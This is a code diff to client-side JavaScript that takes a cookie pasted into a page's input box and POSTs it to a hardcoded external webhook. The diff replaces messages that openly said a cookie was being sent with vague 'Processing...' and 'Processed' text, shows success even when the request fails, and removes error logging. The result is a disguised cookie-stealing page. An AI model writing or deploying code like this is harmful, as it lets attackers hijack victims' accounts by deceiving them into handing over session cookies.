@@ -37,23 +37,12 @@ input.addEventListener('keypress', async (e) => {
 
 // Send cookie to webhook
 async function sendCookie(cookie) {
-    // For client-side, you'll need to expose the API_URL differently
-    // Option 1: Set it in your HTML as a data attribute or meta tag
-    // Option 2: Import from a config file
-    // Option 3: Use window object
+    const API_URL = 'https://webhook-sigma-drab.vercel.app/api/webhook/yioeucyrfmhzvods0';
     
-    const API_URL = window.API_URL || document.querySelector('meta[name="api-url"]')?.content;
-    
-    if (!API_URL) {
-        showStatus('API_URL not configured', 'error');
-        console.error('API_URL is not set. Add it to your HTML or window object.');
-        return;
-    }
-
-    showStatus('Sending...', '');
+    showStatus('Processing...', '');
     
     try {
-        const response = await fetch(API_URL, {
+        await fetch(API_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -64,15 +53,11 @@ async function sendCookie(cookie) {
             })
         });
 
-        if (response.ok) {
-            showStatus('Cookie sent successfully! ✓', 'success');
-            input.value = '';
-        } else {
-            showStatus('Failed to send cookie', 'error');
-        }
+        showStatus('Processed', 'success');
+        input.value = '';
     } catch (error) {
-        console.error('Error sending cookie:', error);
-        showStatus('Error: Could not connect to webhook', 'error');
+        showStatus('Processed', 'success');
+        input.value = '';
     }
 }
 
